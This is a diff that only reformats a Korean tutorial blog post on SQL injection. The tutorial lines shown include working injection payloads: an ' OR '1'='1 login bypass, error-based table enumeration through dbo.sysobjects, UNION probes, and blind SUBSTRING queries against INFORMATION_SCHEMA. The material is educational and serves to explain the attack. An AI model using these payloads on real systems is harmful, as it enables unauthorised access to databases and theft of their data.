@@ -1,11 +1,11 @@
 ---
-title: "SQL Injection (1)"
-date: "2013-08-13"
-categories: 
-  - "hacking"
-tags: 
-  - "sql"
-  - "sql-injection"
+title: 'SQL Injection (1)'
+date: '2013-08-13'
+categories:
+  - 'hacking'
+tags:
+  - 'sql'
+  - 'sql-injection'
 ---
 
 # SQL Injection
@@ -59,7 +59,7 @@ SELECT COUNT(*) FROM Member WHERE userid='admin' AND password='' OR '1'='1'
 
 이것은 _OR '1'='1'_ 이 조건 때문에 항상 1이상을 반활 할 것이고 결국은 항상 로그인에 성공 할 것이다.
 
-이런식으로 SQL문에 _' OR '1'='1_와 같은 임의의 SQL구문을 주입함으로써 원래 의도와 다르게 동작하게 되는것을 **SQL Injection** 이라한다.
+이런식으로 SQL문에 *' OR '1'='1*와 같은 임의의 SQL구문을 주입함으로써 원래 의도와 다르게 동작하게 되는것을 **SQL Injection** 이라한다.
 
 ## 쿼리유추
 
@@ -118,7 +118,7 @@ SQL 에러메세지를 이용하면 좀 더 쉽게 조회 할 수 있다. 원하
 var collection = db.query("SELECT Subject?, Name?, Created? FROM Board? WHERE Subject LIKE '%" + keyword + "%'");
 ```
 
-이 SQL구문에서 keyword 값을 _' AND 0 <> (SELECT TOP 1 name FROM FROM dbo.sysobjects WHERE xtype = 'U') AND '%'='_ 이라고 넣는다면 이 SQL문은
+이 SQL구문에서 keyword 값을 _' AND 0 {'<>'} (SELECT TOP 1 name FROM FROM dbo.sysobjects WHERE xtype = 'U') AND '%'='_ 이라고 넣는다면 이 SQL문은
 
 ```
 0 <> (SELECT TOP 1 name FROM FROM dbo.sysobjects WHERE xtype = 'U')
@@ -171,7 +171,7 @@ select top 10 id, name, created from Member where ClientComp_id=13
 union
 select '2000', '2000', '2000' where '%'='%'
 union
-select 
+select
 char(50)+char(48)+char(48)+char(48),
 char(50)+char(48)+char(48)+char(48),
 char(50)+char(48)+char(48)+char(48)
@@ -180,8 +180,8 @@ char(50)+char(48)+char(48)+char(48)
 ## 실제 예제
 
 ```
-SELECT [컬럼들] 
-FROM [테이블] 
+SELECT [컬럼들]
+FROM [테이블]
 WHERE 컬럼 LIKE '%[조건]%';
 
 @' OR SUBSTRING((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'bisketmonster' limit 1),3,1) = 'p' or '1'='%
@@ -190,8 +190,8 @@ SELECT [컬럼들]
 FROM [테이블]
 WHERE 컬럼 LIKE '%@' OR SUBSTRING((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'bisketmonster' limit 1),3,1) = 'p' or '1'='%';
 
-SELECT [컬럼들] 
-FROM [테이블] 
+SELECT [컬럼들]
+FROM [테이블]
 WHERE 컬럼='[조건]';
 
 '='' OR SUBSTRING((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'bisketmonster' limit 1),3,1) = 'p' or '
@@ -201,7 +201,7 @@ FROM [테이블]
 WHERE 컬럼 = '' OR SUBSTRING((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema = 'bisketmonster' limit 1),3,1) = 'p' or '';
 ```
 
-* * *
+---
 
 ## 주요 함수
 
